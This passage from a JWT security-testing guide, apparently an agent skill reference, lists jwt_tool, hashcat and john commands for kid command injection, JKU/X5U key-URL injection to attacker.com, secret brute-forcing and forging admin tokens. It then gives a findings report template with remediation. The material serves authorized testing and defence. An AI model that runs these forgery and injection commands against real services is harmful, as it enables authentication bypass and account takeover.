# testing-for-json-web-token-vulnerabilities — 详细参考（由 SKILL.md 拆分）

# Command injection via kid (rare but possible)
python3 jwt_tool.py <JWT_TOKEN> -I -hc kid -hv "key1|curl attacker.com"
```

### Step 5 — Test JKU/X5U Header Injection
```bash
# JKU (JSON Web Key Set URL) injection
# Point jku to attacker-controlled JWKS
# Step 1: Generate key pair
python3 jwt_tool.py <JWT_TOKEN> -X s

# Step 2: Host JWKS on attacker server
# jwt_tool generates jwks.json - host it at http://attacker.com/.well-known/jwks.json

# Step 3: Modify JWT header to point to attacker JWKS
python3 jwt_tool.py <JWT_TOKEN> -X s -ju "http://attacker.com/.well-known/jwks.json"

# X5U (X.509 certificate URL) injection
# Similar to JKU but using X.509 certificate chain
python3 jwt_tool.py <JWT_TOKEN> -I -hc x5u -hv "http://attacker.com/cert.pem"

# Embedded JWK attack (inject key in JWT header itself)
python3 jwt_tool.py <JWT_TOKEN> -X i
```

### Step 6 — Brute-Force Weak JWT Secrets
```bash
# Brute-force HMAC secret with hashcat
hashcat -a 0 -m 16500 <JWT_TOKEN> /usr/share/wordlists/rockyou.txt

# Using jwt_tool wordlist attack
python3 jwt_tool.py <JWT_TOKEN> -C -d /usr/share/wordlists/rockyou.txt

# Using john the ripper
echo "<JWT_TOKEN>" > jwt.txt
john jwt.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=HMAC-SHA256

# Common weak secrets to try:
# secret, password, 123456, admin, test, key, jwt_secret
# Also try: application name, company name, domain name

# Once secret is found, forge arbitrary tokens
python3 jwt_tool.py <JWT_TOKEN> -S hs256 -p "discovered_secret" \
  -I -pc role -pv admin -pc sub -pv "admin@target.com"
```

## Key Concepts

| Concept | Description |
|---------|-------------|
| Algorithm Confusion | Switching from asymmetric (RS256) to symmetric (HS256) using public key as secret |
| None Algorithm | Setting alg to "none" to create unsigned tokens accepted by misconfigured servers |
| Kid Injection | Exploiting the Key ID header parameter for SQLi, path traversal, or SSRF |
| JKU/X5U Injection | Pointing key source URLs to attacker-controlled servers for key substitution |
| Weak Secret | HMAC secrets that can be brute-forced using dictionary attacks |
| Claim Tampering | Modifying payload claims (role, sub, admin) after bypassing signature verification |
| Token Replay | Reusing valid JWTs after the intended session should have expired |

## Tools & Systems

| Tool | Purpose |
|------|---------|
| jwt_tool | Comprehensive JWT testing and exploitation toolkit |
| JWT Editor (Burp) | Burp Suite extension for JWT manipulation and attack automation |
| hashcat | GPU-accelerated JWT secret brute-forcing (mode 16500) |
| john the ripper | CPU-based JWT secret cracking |
| jwt.io | Online JWT decoder and debugger for inspection |
| PyJWT | Python library for programmatic JWT creation and verification |

## Common Scenarios

1. **None Algorithm Bypass** — Change JWT algorithm to "none", remove signature, and forge admin tokens on servers that accept unsigned JWTs
2. **Algorithm Confusion RCE** — Switch RS256 to HS256 using leaked public key to forge arbitrary tokens for administrative access
3. **Kid SQL Injection** — Inject SQL payload in kid parameter to extract the signing key from the database
4. **Weak Secret Cracking** — Brute-force HMAC-SHA256 secrets using hashcat to forge arbitrary JWTs for any user
5. **JKU Server Spoofing** — Point JKU header to attacker-controlled JWKS endpoint to sign tokens with attacker's private key

## Output Format

```
## JWT Security Assessment Report
- **Target**: http://target.com
- **JWT Algorithm**: RS256 (claimed)
- **JWKS Endpoint**: http://target.com/.well-known/jwks.json

### Findings
| # | Vulnerability | Technique | Impact | Severity |
|---|--------------|-----------|--------|----------|
| 1 | None algorithm accepted | alg: "none" | Auth bypass | Critical |
| 2 | Algorithm confusion | RS256 -> HS256 | Token forgery | Critical |
| 3 | Weak HMAC secret | Brute-force: "secret123" | Full token forgery | Critical |
| 4 | Kid path traversal | kid: "../../dev/null" | Sign with empty key | High |

### Remediation
- Enforce algorithm whitelist in JWT verification (reject "none")
- Use asymmetric algorithms (RS256/ES256) with proper key management
- Implement strong, random secrets for HMAC algorithms (256+ bits)
- Validate kid parameter against a strict allowlist
- Ignore jku/x5u headers or validate against known endpoints
- Set appropriate token expiration (exp) and implement token revocation
```
